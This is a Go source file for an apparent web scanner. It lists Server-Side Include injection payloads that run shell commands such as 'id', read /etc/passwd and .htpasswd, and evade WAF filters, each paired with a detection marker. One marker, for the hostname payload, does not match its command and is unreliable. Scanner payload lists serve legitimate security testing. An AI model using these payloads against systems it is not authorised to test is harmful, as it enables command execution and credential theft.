package ssi

// Payload represents an SSI injection payload.
type Payload struct {
	Value       string
	Marker      string // String to search for in response indicating execution
	Description string
	WAFBypass   bool
}

// GetPayloads returns standard SSI injection payloads.
func GetPayloads() []Payload {
	return standardPayloads
}

// GetWAFBypassPayloads returns payloads designed to evade WAF filtering.
func GetWAFBypassPayloads() []Payload {
	return wafBypassPayloads
}

// GetAllPayloads returns all SSI injection payloads including WAF bypass variants.
func GetAllPayloads() []Payload {
	all := make([]Payload, 0, len(standardPayloads)+len(wafBypassPayloads))
	all = append(all, standardPayloads...)
	all = append(all, wafBypassPayloads...)
	return all
}

// Standard SSI injection payloads.
// Source: OWASP WSTG-INPV-08, PayloadsAllTheThings
var standardPayloads = []Payload{
	{
		Value:       `<!--#exec cmd="echo skws_ssi_test"-->`,
		Marker:      "skws_ssi_test",
		Description: "SSI exec command directive",
	},
	{
		Value:       `<!--#exec cmd="id"-->`,
		Marker:      "uid=",
		Description: "SSI exec id command",
	},
	{
		Value:       `<!--#include virtual="/etc/passwd"-->`,
		Marker:      "root:",
		Description: "SSI include virtual /etc/passwd",
	},
	{
		Value:       `<!--#include file="/etc/passwd"-->`,
		Marker:      "root:",
		Description: "SSI include file /etc/passwd",
	},
	{
		Value:       `<!--#echo var="DATE_LOCAL"-->`,
		Marker:      "20",
		Description: "SSI echo DATE_LOCAL variable",
	},
	{
		Value:       `<!--#echo var="DOCUMENT_URI"-->`,
		Marker:      "/",
		Description: "SSI echo DOCUMENT_URI variable",
	},
	{
		Value:       `<!--#echo var="SERVER_SOFTWARE"-->`,
		Marker:      "Apache",
		Description: "SSI echo SERVER_SOFTWARE variable",
	},
	{
		Value:       `<!--#config timefmt="%Y"--><!--#echo var="DATE_LOCAL"-->`,
		Marker:      "20",
		Description: "SSI config and echo combination",
	},
	{
		Value:       `<!--#exec cmd="cat /etc/hostname"-->`,
		Marker:      "skws_ssi_test",
		Description: "SSI exec cat hostname",
	},
	{
		Value:       `<!--#include virtual="/.htpasswd"-->`,
		Marker:      ":",
		Description: "SSI include htpasswd file",
	},
}

// WAF bypass SSI injection payloads.
// Source: PayloadsAllTheThings, HackTricks
var wafBypassPayloads = []Payload{
	{
		Value:       "<!--#exec%20cmd=\"echo skws_ssi_waf\"-->",
		Marker:      "skws_ssi_waf",
		Description: "URL-encoded space in SSI directive",
		WAFBypass:   true,
	},
	{
		Value:       "<!--#exec\tcmd=\"echo skws_ssi_tab\"-->",
		Marker:      "skws_ssi_tab",
		Description: "Tab character in SSI directive",
		WAFBypass:   true,
	},
	{
		Value:       "<!--#EXEC CMD=\"echo skws_ssi_upper\"-->",
		Marker:      "skws_ssi_upper",
		Description: "Uppercase SSI directive bypass",
		WAFBypass:   true,
	},
	{
		Value:       "<!--#exec cmd='echo skws_ssi_sq'-->",
		Marker:      "skws_ssi_sq",
		Description: "Single-quoted SSI directive",
		WAFBypass:   true,
	},
}
